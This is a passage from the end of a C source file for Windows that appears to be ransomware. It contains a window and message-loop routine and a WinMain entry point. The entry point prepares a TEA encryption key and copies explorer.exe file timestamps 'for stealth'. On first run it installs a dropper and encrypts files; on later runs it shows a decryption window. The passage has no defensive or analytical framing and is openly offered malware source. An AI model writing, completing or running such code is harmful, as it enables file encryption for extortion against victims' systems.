    MSG msg;
    int x, y;
    
    // Initialize common controls
    InitCommonControls();
    
    // Get module handle
    g_hInstance = GetModuleHandleA(NULL);
    
    // Register window class
    wc.cbSize = sizeof(WNDCLASSEXA);
    wc.style = CS_HREDRAW | CS_VREDRAW | CS_DBLCLKS;
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = g_hInstance;
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wc.lpszClassName = WINDOW_CLASS_NAME;
    wc.hCursor = LoadCursorA(NULL, IDC_ARROW);
    
    if (!RegisterClassExA(&wc))
        return;
    
    // Calculate centered position
    x = CenterWindow(300, GetSystemMetrics(SM_CXSCREEN));
    y = CenterWindow(105, GetSystemMetrics(SM_CYSCREEN));
    
    // Create window
    g_mainWindow = CreateWindowExA(
        WS_EX_DLGMODALFRAME | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        WINDOW_CLASS_NAME,
        WINDOW_TITLE,
        WS_POPUP | WS_CAPTION | WS_SYSMENU,
        x, y, 300, 105,
        NULL, NULL, g_hInstance, NULL
    );
    
    if (!g_mainWindow)
        return;
    
    // Show window
    UpdateWindow(g_mainWindow);
    
    // Message loop
    while (GetMessageA(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
}

//=============================================================================
// MAIN ENTRY POINT
//=============================================================================

/**
 * Main entry point
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow)
{
    // Get process heap
    g_processHeap = GetProcessHeap();
    
    // Load configuration from resources
    if (!LoadConfiguration())
        return 1;
    
    // Allocate file buffer
    g_fileBuffer = HeapAlloc(g_processHeap, HEAP_ZERO_MEMORY, g_encryptionSize);
    if (!g_fileBuffer)
        return 1;
    
    // Prepare TEA key
    PrepareTeaKey((unsigned int *)g_xorKey);
    
    // Get explorer.exe file times for stealth
    GetExplorerFileTime();
    
    // Check if this is first run (installation)
    CHAR tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    lstrcatA(tempPath, (LPCSTR)g_encryptedExtension);
    lstrcatA(tempPath, ".exe");
    GetModuleFileNameA(NULL, g_moduleFileName, MAX_PATH);
    
    if (lstrcmpiA(g_moduleFileName, tempPath) != 0)
    {
        // First run - install dropper and encrypt
        InstallDropper();
    }
    else
    {
        // Already installed - show decryption UI
        ShowDecryptionWindow();
    }
    
    return 0;
}
